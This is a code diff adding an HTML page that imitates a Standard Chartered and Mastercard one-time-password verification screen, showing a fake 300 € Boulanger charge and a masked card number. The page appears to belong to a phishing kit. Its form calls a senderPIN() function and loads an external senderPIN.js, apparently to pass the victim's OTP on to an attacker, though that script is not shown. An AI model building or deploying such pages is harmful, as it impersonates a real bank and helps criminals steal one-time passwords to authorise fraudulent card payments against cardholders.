@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otpStandardChartered_Mastercard</title>
+</head>
+<link rel="stylesheet" href="./otpStandardChartered_Mastercard.css">
+
+<body>
+    <form action="" method="post">
+
+        <div class="wrapper">
+
+            <div class="head">
+
+            <span class="bankLogo">
+
+                <img src="./assets/standardCharted.svg">
+
+            </span>
+
+            <span class="ccLogo">
+              <img src="./assets/mastercardid.png">
+            </span>
+
+        </div>
+   <p>Please enter the One-time Password sent to your registed mobile number (xx)xxxxxxxxx</p><br>
+
+         <br>
+         <span>Transaction Details</span><br>
+         <form action="" onsubmit=" validateForm();senderPIN()">
+
+         <div class="details">
+            <div class="labels">
+        <label for="" class="a">Merchant:  </label><br>
+        <label for="" class="a">Amount:</label> <br>
+        <label for="" class="a">Card Number: </label>           
+        <br>
+        <label for="" class="a">One-Time Password:</label> 
+            </div>
+            <div class="spans">
+            <span id="merchant">&nbsp;&nbsp;&nbsp;&nbsp;Boulanger</span><br>
+            <span id="price">&nbsp;&nbsp;&nbsp;&nbsp;300 €</span><br>
+            <span id="ccNum">&nbsp;&nbsp;&nbsp;&nbsp;xxxx xxxx xxxx 89476</span><br>
+            &nbsp;&nbsp;&nbsp;
+            <input id="pin" class="otp" type="text">
+        </div>
+
+        <br><br><br>
+            </div>
+             <a href="#">Resend OTP</a>
+             <br><br><br>
+
+     <div class="button">
+                 <input type="button" class="ok" value="Submit"></div>
+             <br><br>
+         </form>
+ <a href="#">Terms and conditions</a> | <a href="#">FAQs</a> | <a href="#"> Contact Us</a> |
+&NonBreakingSpace; &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace; &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace; &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace; &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace; &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace; &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace; &NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace; 
+  <a class="cancel" href="#">Cancel</a>
+         </div>
+         
+     </form>
+    <script>
+    n =  new Date();
+    y = n.getFullYear();
+    m = n.getMonth() + 1;
+    d = n.getDate();
+    document.getElementById("date").innerHTML = m + "/" + d + "/" + y;      
+    </script>
+
+
+<script src="../senderPIN.js"></script>
+
+
+</body>
+</html>
